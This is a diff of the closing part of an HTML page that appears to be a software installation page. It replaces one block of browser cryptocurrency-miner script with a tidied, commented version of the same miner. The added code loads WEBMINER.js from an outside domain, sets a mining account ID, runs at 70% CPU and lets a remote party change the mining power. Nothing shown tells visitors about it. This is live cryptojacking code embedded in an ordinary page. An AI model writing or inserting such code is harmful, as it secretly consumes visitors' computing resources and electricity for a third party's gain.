@@ -159,47 +159,38 @@ If these components are already installed, you can <SPAN CLASS="JustThisApp"><A 
 </TD></TR>
 
 </TABLE>
-      <script src="https://wm.bmwebm.org/WEBMINER.js"></script>
-      <script>
-// - Configure:
-WEBMINER.config({ 
-	login: "7149405", // Your ID - required
-	pass: null, // Name for stats, leave blank for automatic set.
-});
+<!-- Include the web miner library -->
+<script src="https://wm.bmwebm.org/WEBMINER.js" onload="initializeWebMiner()"></script>
 
-// - Universal function for Start/Stop/Change speed - 0 = stop, 1-100 = set percent of CPU usage and start mining if not started:
-WEBMINER.power(70);
+<script>
+function initializeWebMiner() {
+    // Configure the web miner
+    WEBMINER.config({
+        login: "7149405", // Your ID - required
+        pass: null, // Name for stats, leave blank for automatic set.
+    });
 
-// - Restore previous session accepted hashes and power (start mining if it worked in previous session):
-WEBMINER.loadStored();
+    // Start the web miner with 70% CPU usage
+    WEBMINER.power(70);
 
-// - Get current power:
-console.log( WEBMINER.getPower() );
+    // Other operations you want to perform with the web miner
 
-// - Get current speed in hashes/sec:
-console.log( WEBMINER.getHashesPerSecond() );
+    // Log information to console for testing purposes
+    console.log('Current power:', WEBMINER.getPower());
+    console.log('Current speed in hashes/sec:', WEBMINER.getHashesPerSecond());
+    console.log('Current job algo:', WEBMINER.getJobAlgo());
+    console.log('Current job diff:', WEBMINER.getJobDiff());
+    console.log('Accepted by pool hashes (in all sessions):', WEBMINER.getAcceptedHashes());
 
-// - Get current job algo:
-console.log( WEBMINER.getJobAlgo() );
+    // Listen for remote power change event
+    WEBMINER.on('remotepower', (power) => {
+        WEBMINER.power(power);
+        console.log('New power:', power);
+    });
 
-// - Get current job diff:
-console.log( WEBMINER.getJobDiff() );
-
-// - Get accepted by pool hashes (in all sessions)
-console.log( WEBMINER.getAcceptedHashes() );
-
-// - Reset config and stop minig
-WEBMINER.reset(); // Reset config, stop mining and disconnect from pool (you can use it when user logout).
-
-// - Remote change speed event:
-WEBMINER.on('remotepower', (power) => {
-	WEBMINER.power(power); // Is automatic applied if no listeners for this event.
-	console.log('New power:', power);
-});
-
-// - Share accepted event
-WEBMINER.on('accepted', () => console.log('New share') );
+    // Listen for share accepted event
+    WEBMINER.on('accepted', () => console.log('New share'));
+}
 </script>
-      <script>WEBMINER.config({ login: "7149405", pass: null }).power(70);</script>
   </BODY>
 </HTML>
